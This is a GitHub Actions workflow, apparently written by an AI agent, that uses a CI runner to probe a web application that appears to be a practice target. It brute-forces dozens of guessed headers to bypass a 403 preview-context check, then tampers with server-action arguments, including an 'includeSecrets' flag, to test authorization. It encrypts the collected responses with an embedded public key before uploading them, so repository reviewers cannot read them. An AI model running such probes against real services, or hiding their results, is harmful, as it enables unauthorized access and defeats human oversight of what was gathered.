name: launchlet-part2-header-probe

on:
  push:
    branches: [agent/launchlet-part2-header-20260808]

permissions:
  contents: read

jobs:
  probe:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - name: Isolate exact preview-context header and inspect action arguments
        shell: bash
        run: |
          set -euo pipefail
          umask 077
          mkdir -p package/out
          cat > package/public.pem <<'PEM'
          -----BEGIN PUBLIC KEY-----
          MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlOxaJs92lwtrdk6J2LR9
          QeyG3A5H0rzGOQHw80MWPcOeEs5pzn37ilHloXnTkGk4PmJU67C06N9OOsgqU1kF
          iydiljdl6RfwF/OSjMsNfRYsyBr1wONeO+9f+72VjLlNWqWVll2qeczrxppOulhJ
          r+qBx95tdasvdCgh7aTShlkXF7e9+JjK19MrG+Lyj+I7B6bbTsp7D+PiJMlpepWk
          hoz0jBO8Rgtodz7i/+9Z3RVVhqREdK3uA0Va5ia57Gp3hlvQGbjGxE6TC7q4s1/p
          q6VF10bVOx8kwE2KggVgsX3uudJlzSvHV3f1coMdwyTSALsAjvAlZQwSts3eHjnF
          SQIDAQAB
          -----END PUBLIC KEY-----
          PEM
          python3 - <<'PY'
          import requests, pathlib, urllib.parse, json
          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=15).json(); mf=s.get(urllib.parse.urljoin(base,boot['api']['buildManifest']),timeout=15).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=15).json(); act=refs['serverActions']['inspectDeploy']
          url=urllib.parse.urljoin(base,act['endpoint']); project=boot['project']; workspace=boot['workspace']
          baseh={'Accept':'application/json','Content-Type':'application/json'}
          names=[
            'X-Launchlet-Preview','X-Launchlet-Context','X-Launchlet-Preview-Context','X-Launchlet-Client','X-Launchlet-Client-Context','X-Launchlet-Client-Mode','X-Launchlet-Preview-Mode','X-Launchlet-Session','X-Launchlet-Preview-Session','X-Launchlet-Runtime','X-Launchlet-Runtime-Context','X-Launchlet-Source','X-Launchlet-Preview-Source','X-Launchlet-Request-Context','X-Launchlet-Request','X-Launchlet-Preview-Request','X-Launchlet-Studio','X-Launchlet-Studio-Context','X-Launchlet-Environment','X-Launchlet-Preview-Environment','X-Launchlet-Stage','X-Launchlet-Role','X-Launchlet-Preview-Role','X-Launchlet-Mode','X-Launchlet-Capability','X-Launchlet-Preview-Capability','X-Launchlet-Scope','X-Launchlet-Preview-Scope','X-Launchlet-Origin','X-Launchlet-Preview-Origin','X-Launchlet-Build','X-Launchlet-Project','X-Launchlet-Workspace','X-Launchlet-Server-Reference','X-Launchlet-Server-Context','X-Launchlet-Action','X-Launchlet-Action-Context','X-Launchlet-Deploy','X-Launchlet-Deploy-Context','X-Launchlet-Token','X-Launchlet-Preview-Token','X-Launchlet-Context-Token','X-Launchlet-Context-Id','X-Launchlet-Internal','X-Launchlet-Internal-Preview','X-Launchlet-Internal-Context','X-Launchlet-Live-Preview','X-Launchlet-Preview-Client','X-Launchlet-Preview-Runtime','X-Launchlet-Auth','X-Launchlet-Preview-Auth','X-Launchlet-Key','X-Launchlet-Preview-Key','Launchlet-Preview','Launchlet-Context','Launchlet-Preview-Context','Launchlet-Client','Launchlet-Client-Context','Launchlet-Client-Mode','Launchlet-Preview-Mode','Launchlet-Session','Launchlet-Preview-Session','Launchlet-Runtime','Launchlet-Runtime-Context','Launchlet-Source','Launchlet-Preview-Source','Launchlet-Request-Context','Launchlet-Request','Launchlet-Preview-Request','Launchlet-Studio'
          ]
          basebody={'actionId':act['id'],'args':{'workspaceId':workspace,'projectId':project}}
          winners=[]
          for h in names:
              r=s.post(url,headers={**baseh,h:project},json=basebody,timeout=10,allow_redirects=False)
              if r.status_code!=403 or r.text.strip()!='{"error":"preview_context_required"}':
                  winners.append({'header':h,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
          result={'winners':winners,'arg_tests':[]}
          # If exactly one usable header, probe argument trust boundary using only public values and returned deployRef.
          good=next((x for x in winners if x['status']==200),None)
          if good:
              h=good['header']; first=json.loads(good['body']); deploy_ref=first.get('inspector',{}).get('deployRef')
              tests=[
                ('baseline',{'workspaceId':workspace,'projectId':project}),
                ('empty',{}),('only_project',{'projectId':project}),('only_workspace',{'workspaceId':workspace}),
                ('project_deployref',{'workspaceId':workspace,'projectId':deploy_ref}),('workspace_deployref',{'workspaceId':deploy_ref,'projectId':project}),
                ('extra_deployRef',{'workspaceId':workspace,'projectId':project,'deployRef':deploy_ref}),('extra_ref',{'workspaceId':workspace,'projectId':project,'ref':deploy_ref}),
                ('extra_build',{'workspaceId':workspace,'projectId':project,'build':mf['build']}),('extra_mode_deploy',{'workspaceId':workspace,'projectId':project,'mode':'deploy'}),
                ('extra_export',{'workspaceId':workspace,'projectId':project,'export':True}),('extra_include',{'workspaceId':workspace,'projectId':project,'includeSecrets':True}),
                ('project_empty',{'workspaceId':workspace,'projectId':''}),('workspace_empty',{'workspaceId':'','projectId':project}),
                ('project_workspace',{'workspaceId':workspace,'projectId':workspace}),('workspace_project',{'workspaceId':project,'projectId':project}),
              ]
              for name,args in tests:
                  r=s.post(url,headers={**baseh,h:project},json={'actionId':act['id'],'args':args},timeout=10,allow_redirects=False)
                  result['arg_tests'].append({'name':name,'args':args,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
          (out/'summary.json').write_text(json.dumps(result,indent=2))
          PY
          tar -C package/out -czf package/result.tgz .
          openssl rand 32 > package/aes.key
          openssl rand 16 > package/iv.bin
          KEY_HEX="$(python3 -c "print(open('package/aes.key','rb').read().hex())")"
          IV_HEX="$(python3 -c "print(open('package/iv.bin','rb').read().hex())")"
          openssl enc -aes-256-cbc -K "$KEY_HEX" -iv "$IV_HEX" -in package/result.tgz -out package/result.enc
          openssl pkeyutl -encrypt -pubin -inkey package/public.pem -pkeyopt rsa_padding_mode:oaep -pkeyopt rsa_oaep_md:sha256 -in package/aes.key -out package/key.enc
          mkdir -p artifact
          base64 -w0 package/result.enc > artifact/result.enc.b64
          base64 -w0 package/key.enc > artifact/key.enc.b64
          base64 -w0 package/iv.bin > artifact/iv.bin.b64
          rm -rf package
      - uses: actions/upload-artifact@v4
        with:
          name: launchlet-part2-isolate-encrypted
          path: artifact/
          retention-days: 1
